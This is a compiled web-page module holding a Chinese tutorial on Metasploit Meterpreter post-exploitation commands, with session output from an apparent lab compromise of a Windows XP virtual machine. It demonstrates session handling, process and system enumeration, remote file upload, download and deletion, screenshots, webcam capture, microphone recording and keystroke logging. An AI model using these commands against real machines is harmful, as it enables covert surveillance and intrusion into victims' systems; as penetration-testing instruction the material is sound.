import{i as e,r as t,s as n,t as r}from"./app-C53NY-cV.js";var i=JSON.parse(`{"path":"/md/hack/tools/2022-05-02-015-Metasploit%E5%9F%BA%E6%9C%AC%E5%90%8E%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4.html","title":"Metasploit基本后渗透命令","lang":"zh-CN","frontmatter":{"category":"binghe-code-hack","title":"Metasploit基本后渗透命令","tagline":"by 冰河","tag":["hack","binghe-code-hack"],"excerpt":"Metasploit基本后渗透命令","lock":"need"},"git":{"updatedTime":1777479520000,"contributors":[{"name":"binghe001","username":"binghe001","email":"“1028386804@qq.com”","commits":1,"url":"https://github.com/binghe001"}],"changelog":[{"hash":"7b4fb9b490c0240f5c694694f3fbc97d93e36561","time":1777479520000,"email":"“1028386804@qq.com”","author":"binghe001","message":"feature: 升级到vuepress2"}]},"filePathRelative":"md/hack/tools/2022-05-02-015-Metasploit基本后渗透命令.md"}`),a={name:`2022-05-02-015-Metasploit基本后渗透命令.md`};function o(r,i,a,o,s,c){return n(),t(`div`,null,[...i[0]||=[e(`<h1 id="metasploit基本后渗透命令" tabindex="-1"><a class="header-anchor" href="#metasploit基本后渗透命令"><span>Metasploit基本后渗透命令</span></a></h1><p>核心Meterpreter命令指的是已经被Meterpreter攻击载荷成功渗透的计算机向我们提供的用于后渗透操作的基本功能。</p><p><strong>注意：Metasploit的后渗透命令都是在拿到了目标主机的Meterpreter权限之后，在Meterpreter命令行下执行的各种命令操作。</strong></p><h3 id="帮助菜单" tabindex="-1"><a class="header-anchor" href="#帮助菜单"><span>帮助菜单</span></a></h3><p>输入help或者英文?就可以打开帮主菜单，如下所示：</p><p><img src="https://img-blog.csdnimg.cn/20190127151346199.png" alt="img"></p><p>这里，输出的结果比较多，我只是截取了一部分信息。</p><h3 id="后渗透命令" tabindex="-1"><a class="header-anchor" href="#后渗透命令"><span>后渗透命令</span></a></h3><p>在进行渗透的时候，有时需要执行其他的任务。为了执行新的任务，需要将当前执行的Meterpreter会话切换到后台，这时就需要用到background命令。</p><p>如下：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; background</span>
<span class="line">[*] Backgrounding session 1...</span>
<span class="line">msf5 exploit(windows/http/rejetto_hfs_exec) &gt; </span>
<span class="line"></span>
<span class="line">此时，就需要将一个会话切换到前台的时候，就可以使用sessions命令加上该会话的标识符，命令格式为sessions -i</span>
<span class="line">msf5 exploit(windows/http/rejetto_hfs_exec) &gt; sessions</span>
<span class="line"></span>
<span class="line">Active sessions</span>
<span class="line">===============</span>
<span class="line"></span>
<span class="line">  Id  Name  Type                     Information                    Connection</span>
<span class="line">  --  ----  ----                     -----------                    ----------</span>
<span class="line">  1         meterpreter x86/windows  LIUYAZHUANG\\lyz @ LIUYAZHUANG  192.168.175.128:4444 -&gt; 192.168.175.130:1043 (192.168.175.130)</span>
<span class="line"></span>
<span class="line">msf5 exploit(windows/http/rejetto_hfs_exec) &gt; sessions -i 1</span>
<span class="line">[*] Starting interaction with 1...</span>
<span class="line"></span>
<span class="line">meterpreter &gt; </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="机器id和uuid命令" tabindex="-1"><a class="header-anchor" href="#机器id和uuid命令"><span>机器ID和UUID命令</span></a></h3><p>获取机器ID的命令：machine_id</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; machine_id</span>
<span class="line">[+] Machine ID: 172edb45d23942c9e4cbe768909b4f62</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>获取uuid的命令：uuid</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; uuid</span>
<span class="line">[+] UUID: 0535181070ecda36/x86=1/windows=1/2019-01-25T01:43:55Z</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="通信信道的操作" tabindex="-1"><a class="header-anchor" href="#通信信道的操作"><span>通信信道的操作</span></a></h3><p>这些操作可以通过channel实现</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; channel -l</span>
<span class="line"></span>
<span class="line">    Id  Class  Type</span>
<span class="line">    --  -----  ----</span>
<span class="line">    1   3      stdapi_process</span>
<span class="line"></span>
<span class="line">meterpreter &gt; </span>
<span class="line">meterpreter &gt; channel -r 1</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里，我们使用channel -l 命令列出了所有可用的通信信道，然后使用channel -r [channel-id]命令选择了读取数据的通信信道。信道子系统允许通过所有的逻辑信道进行读取、列举、写入操作，这些逻辑信道都是Meterpreter命令行实现的通信子信道。</p><h3 id="获取用户名和进程信息" tabindex="-1"><a class="header-anchor" href="#获取用户名和进程信息"><span>获取用户名和进程信息</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; machine_id </span>
<span class="line">[+] Machine ID: 172edb45d23942c9e4cbe768909b4f62</span>
<span class="line">meterpreter &gt; getuid</span>
<span class="line">Server username: LIUYAZHUANG\\lyz</span>
<span class="line">meterpreter &gt; getpid </span>
<span class="line">Current pid: 1680</span>
<span class="line">meterpreter &gt; ps</span>
<span class="line"></span>
<span class="line">Process List</span>
<span class="line">============</span>
<span class="line"></span>
<span class="line"> PID   PPID  Name               Arch  Session  User                 Path</span>
<span class="line"> ---   ----  ----               ----  -------  ----                 ----</span>
<span class="line"> 0     0     [System Process]                                       </span>
<span class="line"> 4     0     System             x86   0                             </span>
<span class="line"> 236   672   VGAuthService.exe  x86   0        NT AUTHORITY\\SYSTEM  C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\VGAuthService.exe</span>
<span class="line"> 244   1040  wscntfy.exe        x86   0        LIUYAZHUANG\\lyz      C:\\WINDOWS\\system32\\wscntfy.exe</span>
<span class="line"> 336   672   vmtoolsd.exe       x86   0        NT AUTHORITY\\SYSTEM  C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe</span>
<span class="line"> 480   1680  hfs.exe            x86   0        LIUYAZHUANG\\lyz      E:\\©������\\HFS\\hfs.exe</span>
<span class="line"> 540   4     smss.exe           x86   0        NT AUTHORITY\\SYSTEM  \\SystemRoot\\System32\\smss.exe</span>
<span class="line"> 604   540   csrss.exe          x86   0        NT AUTHORITY\\SYSTEM  \\??\\C:\\WINDOWS\\system32\\csrss.exe</span>
<span class="line"> 608   1220  cmd.exe            x86   0        LIUYAZHUANG\\lyz      C:\\WINDOWS\\system32\\cmd.exe</span>
<span class="line"> 628   540   winlogon.exe       x86   0        NT AUTHORITY\\SYSTEM  \\??\\C:\\WINDOWS\\system32\\winlogon.exe</span>
<span class="line"> 672   628   services.exe       x86   0        NT AUTHORITY\\SYSTEM  C:\\WINDOWS\\system32\\services.exe</span>
<span class="line"> 684   628   lsass.exe          x86   0        NT AUTHORITY\\SYSTEM  C:\\WINDOWS\\system32\\lsass.exe</span>
<span class="line"> 860   672   vmacthlp.exe       x86   0        NT AUTHORITY\\SYSTEM  C:\\Program Files\\VMware\\VMware Tools\\vmacthlp.exe</span>
<span class="line"> 876   672   svchost.exe        x86   0        NT AUTHORITY\\SYSTEM  C:\\WINDOWS\\system32\\svchost.exe</span>
<span class="line"> 944   672   svchost.exe        x86   0                             C:\\WINDOWS\\system32\\svchost.exe</span>
<span class="line"> 1040  672   svchost.exe        x86   0        NT AUTHORITY\\SYSTEM  C:\\WINDOWS\\System32\\svchost.exe</span>
<span class="line"> 1132  672   svchost.exe        x86   0                             C:\\WINDOWS\\system32\\svchost.exe</span>
<span class="line"> 1196  672   alg.exe            x86   0                             C:\\WINDOWS\\System32\\alg.exe</span>
<span class="line"> 1224  876   wmiprvse.exe       x86   0                             C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe</span>
<span class="line"> 1236  672   svchost.exe        x86   0                             C:\\WINDOWS\\system32\\svchost.exe</span>
<span class="line"> 1416  672   spoolsv.exe        x86   0        NT AUTHORITY\\SYSTEM  C:\\WINDOWS\\system32\\spoolsv.exe</span>
<span class="line"> 1428  608   conime.exe         x86   0        LIUYAZHUANG\\lyz      C:\\WINDOWS\\system32\\conime.exe</span>
<span class="line"> 1504  628   logon.scr          x86   0        LIUYAZHUANG\\lyz      C:\\WINDOWS\\System32\\logon.scr</span>
<span class="line"> 1680  1648  explorer.exe       x86   0        LIUYAZHUANG\\lyz      C:\\WINDOWS\\Explorer.EXE</span>
<span class="line"> 1808  1680  vmtoolsd.exe       x86   0        LIUYAZHUANG\\lyz      C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe</span>
<span class="line"> 1832  1680  ctfmon.exe         x86   0        LIUYAZHUANG\\lyz      C:\\WINDOWS\\system32\\ctfmon.exe</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="获取系统信息" tabindex="-1"><a class="header-anchor" href="#获取系统信息"><span>获取系统信息</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; sysinfo</span>
<span class="line">Computer        : LIUYAZHUANG</span>
<span class="line">OS              : Windows XP (Build 2600, Service Pack 3).</span>
<span class="line">Architecture    : x86</span>
<span class="line">System Language : zh_CN</span>
<span class="line">Domain          : WORKGROUP</span>
<span class="line">Logged On Users : 2</span>
<span class="line">Meterpreter     : x86/windows</span>
<span class="line">meterpreter &gt; </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="网络命令" tabindex="-1"><a class="header-anchor" href="#网络命令"><span>网络命令</span></a></h3><ul><li>ipconfig/ifconfig：显示被渗透主机所连接的所有内部网络</li><li>arp：显示所有和被渗透主机建立过连接的IP地址，这样可以获得更过关于目标邻近系统的信息</li><li>netstat：显示当前所有正在使用端口以及运行在这些端口上的进程信息。</li></ul><h3 id="文件操作命令" tabindex="-1"><a class="header-anchor" href="#文件操作命令"><span>文件操作命令</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">pwd：查看当前的工作目录</span>
<span class="line">cd：切换到目标文件夹</span>
<span class="line">cd [目标文件夹]</span>
<span class="line">mkdir：创建文件夹</span>
<span class="line">mkdir [文件夹]</span>
<span class="line">upload:将文件上传到目标系统</span>
<span class="line">upload [本地文件] [目标系统路径]</span>
<span class="line">edit:修改文件</span>
<span class="line">edit [目标文件]</span>
<span class="line">ls：列出目标主机指定目录中的文件</span>
<span class="line">ls [目标文件夹]</span>
<span class="line">rmr:删除目标系统上指定的文件夹</span>
<span class="line">rmr [目标文件夹]</span>
<span class="line">rm：删除目标系统上指定的文件</span>
<span class="line">rm [目标文件]</span>
<span class="line">download：从目标下载文件</span>
<span class="line">download [目标文件] [本地路径]</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="桌面命令" tabindex="-1"><a class="header-anchor" href="#桌面命令"><span>桌面命令</span></a></h3><p>使用enumdesktops和getdesktop可以查看被渗透主机的桌面信息，enumdesktops列出了所有可以访问的桌面，而getdesktop列出了当前桌面的相关信息，如下：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; enumdesktops </span>
<span class="line">Enumerating all accessible desktops</span>
<span class="line"></span>
<span class="line">Desktops</span>
<span class="line">========</span>
<span class="line"></span>
<span class="line">    Session  Station   Name</span>
<span class="line">    -------  -------   ----</span>
<span class="line">    0        WinSta0   Default</span>
<span class="line">    0        WinSta0   Disconnect</span>
<span class="line">    0        WinSta0   Winlogon</span>
<span class="line">    0        SAWinSta  SADesktop</span>
<span class="line"></span>
<span class="line">meterpreter &gt; getdesktop </span>
<span class="line">Session 0\\W\\D</span>
<span class="line">meterpreter &gt; </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="截图和摄像头列举" tabindex="-1"><a class="header-anchor" href="#截图和摄像头列举"><span>截图和摄像头列举</span></a></h3><h4 id="获取当前桌面的快照" tabindex="-1"><a class="header-anchor" href="#获取当前桌面的快照"><span>获取当前桌面的快照</span></a></h4><p>使用screenshot命令</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; screenshot </span>
<span class="line">Screenshot saved to: /root/iOOsMPCB.jpeg</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>截图的结果：</p><p><img src="https://img-blog.csdnimg.cn/20190127151940461.png" alt="img"></p><h4 id="列举摄像头" tabindex="-1"><a class="header-anchor" href="#列举摄像头"><span>列举摄像头</span></a></h4><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">webcam_list </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h4 id="录制实时视频" tabindex="-1"><a class="header-anchor" href="#录制实时视频"><span>录制实时视频</span></a></h4><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">webcam_stream </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h4 id="拍照" tabindex="-1"><a class="header-anchor" href="#拍照"><span>拍照</span></a></h4><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">webcam_snap </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h4 id="进行环境监听" tabindex="-1"><a class="header-anchor" href="#进行环境监听"><span>进行环境监听</span></a></h4><p>某些时候我们可能处于监视目的需要进行环境监听，就可以使用record_mic命令。</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; record_mic </span>
<span class="line">[*] Starting...</span>
<span class="line">[*] Stopped</span>
<span class="line">Audio saved to: /root/hStZovMr.wav</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>也可以使用record_mic命令加上-d参数制定录音的长度，这个参数单位是秒。</p><h4 id="计算目标系统闲置时间" tabindex="-1"><a class="header-anchor" href="#计算目标系统闲置时间"><span>计算目标系统闲置时间</span></a></h4><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">idletime</span>
<span class="line">meterpreter &gt; idletime</span>
<span class="line">User has been idle for: 21 mins 19 secs</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="监控键盘" tabindex="-1"><a class="header-anchor" href="#监控键盘"><span>监控键盘</span></a></h4><ul><li>启动监听：keyscan_start</li><li>导出记录：keyscan_dump</li><li>停止监听：keyscan_stop</li></ul><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; keyscan_start</span>
<span class="line">Starting the keystroke sniffer ...</span>
<span class="line">meterpreter &gt; keyscan_dump </span>
<span class="line">Dumping captured keystrokes...</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">meterpreter &gt; keyscan_stop</span>
<span class="line">Stopping the keystroke sniffer...</span>
<span class="line">meterpreter &gt; </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="写在最后" tabindex="-1"><a class="header-anchor" href="#写在最后"><span>写在最后</span></a></h2><blockquote><p>如果你觉得冰河写的还不错，请微信搜索并关注「 <strong>冰河技术</strong> 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 <strong>冰河技术</strong> 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 <strong>冰河技术</strong> 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 <strong>冰河技术</strong> 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200906013715889.png" alt=""></p>`,55)]])}var s=r(a,[[`render`,o]]);export{i as _pageData,s as default};